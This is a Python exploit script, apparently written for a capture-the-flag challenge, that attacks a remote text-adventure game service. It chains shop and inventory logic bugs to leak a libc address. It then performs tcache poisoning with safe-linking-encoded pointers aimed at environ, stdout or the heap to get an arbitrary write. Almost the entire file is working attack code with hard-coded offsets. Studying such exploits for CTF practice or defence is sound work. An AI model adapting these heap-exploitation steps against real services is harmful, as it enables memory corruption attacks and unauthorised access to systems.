#!/usr/bin/env python3
# 远程直接打：leak libc -> 毒 T=environ -> 长 whisper，观察是否真的写到 T
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2]); MODE=sys.argv[3] if len(sys.argv)>3 else "environ"
def connect(tries=60):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(4)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)
s,b=connect()
if s is None: print("NO BANNER"); sys.exit(1)
# win + leak libc (8 swords unsorted)
for i in range(8): cmd(s,"shop buy 0 1",["tx: item added","not enough"])
cmd(s,"inv equip 8",["tx: main world equipped","invalid"])
for i in range(7): cmd(s,"shop sell 1",["shop sold","invalid"])
cmd(s,"shop sell 1",["shop sold","invalid"])
o=cmd(s,"mw show",["Drops:"])
m=re.search(r"role=None #(\d+)",o)
if not m: print("NO LEAK"); sys.exit(1)
leak=int(m.group(1)); libc=leak-0x90-0x210a90
print("[libc] 0x%x"%libc,flush=True)
# now win via money (5 cycles broadsword double sell) -- need rupees
for i in range(5):
    cmd(s,"shop buy 1 1",["tx: item added","not enough"])
    cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    cmd(s,"mw throw 0",["throws equipped item","invalid"])
    cmd(s,"mw pickup 0",["tx: item added","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    time.sleep(0.2)
cmd(s,"shop buy 3 34",["tx:","not enough"],3)
cmd(s,"map teleport castle",["Encounter"])
cmd(s,"battle",["player turn"])
cmd(s,"use item",["Enter inventory idx"])
cmd(s,"1",["Enter quantity"])
cmd(s,"34",["Battle won"],4)
cmd(s,"mw pickup 0",["tx: item added","invalid"])
cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
o=cmd(s,"mw show",["Drops:"])
m=re.search(r"description_addr=0x([0-9a-f]+)",o)
if not m: print("NO RING"); sys.exit(1)
base=int(m.group(1),16); print("[base] 0x%x"%base,flush=True)
if MODE=="environ": T=libc+0x20bd58
elif MODE=="stdout": T=libc+0x2055c0
elif MODE=="heapstart":
    # guess tcache struct: main arena heap start, page align down from base, +0x10
    T=(base & ~0xfff)|0x10
else: T=int(MODE,16)
print("[T] 0x%x (enc 0x%x)"%(T, T^(base>>12)),flush=True)
fd=T^(base>>12)
cmd(s,"inv drop 1",["inventory frees","invalid"])
cmd(s,"mw whisper 0 "+struct.pack("<Q",fd).hex(),["whispered","only"],3)
# long whisper payload: first 8 bytes also = enc(T), rest = marker
pl=bytearray(b"A"*0x160)
struct.pack_into("<Q",pl,0,fd)
o=cmd(s,"mw whisper 0 "+pl.hex(),["whispered","only","<EOF>"],4)
print("[after long] "+repr(o[-120:]),flush=True)
time.sleep(0.5)
try:
    s.sendall(b"mw show\n"); time.sleep(0.4); s.settimeout(1.5); t=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            t+=d
    except Exception: pass
    print("[alive] "+repr(t[:100]),flush=True)
    s.sendall(b"quit\n"); time.sleep(1); s.settimeout(2); t=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            t+=d
    except Exception: pass
    print("[quit] "+repr(t[:120]),flush=True)
except Exception as e: print("[CRASH] "+str(e),flush=True)
s.close()
